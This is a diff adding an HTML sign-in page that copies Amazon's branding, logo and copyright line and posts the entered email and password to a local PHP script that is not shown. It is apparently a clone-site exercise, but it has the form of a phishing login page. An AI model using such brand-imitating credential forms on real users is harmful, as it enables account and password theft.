@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Amazon Sign In</title>
+  <link rel="stylesheet" href="login.css" >
+</head>
+<body>
+  <div class="container">
+    <img src="image/c-logo.jpg" alt="Amazon Logo" class="logo" />
+
+    <div class="form-box">
+      <h2>Sign in</h2>
+      
+<form action="./php/login.php" method="POST">
+  <label for="email">Email</label>
+  <input type="email" name="email" required>
+
+  <label for="password">Password</label>
+  <input type="password" name="password" required>
+
+  <button type="submit">Login</button>
+</form>
+
+
+
+      
+
+      <div class="help-section">
+        <button class="toggle-help" onclick="toggleHelp()">&#9650; Need help?</button>
+        <div class="help-links" id="helpLinks">
+          <a href="#">Forgot your password?</a><br />
+        </div>
+      </div>
+
+      
+      <hr />
+      <p class="new"><b><strong>New to Amazon?</strong></b></p>
+      <a href="new_account.html" class="nav-link"><button>create new account</button></a>
+    </div>
+
+    <div class="footer">
+      <a href="#">Conditions of Use</a>
+      <a href="#">Privacy Notice</a>
+      <a href="#">Help</a>
+      <p>© 2025, Amazon.com</p>
+    </div>
+  </div>
+
+</body>
+</html>
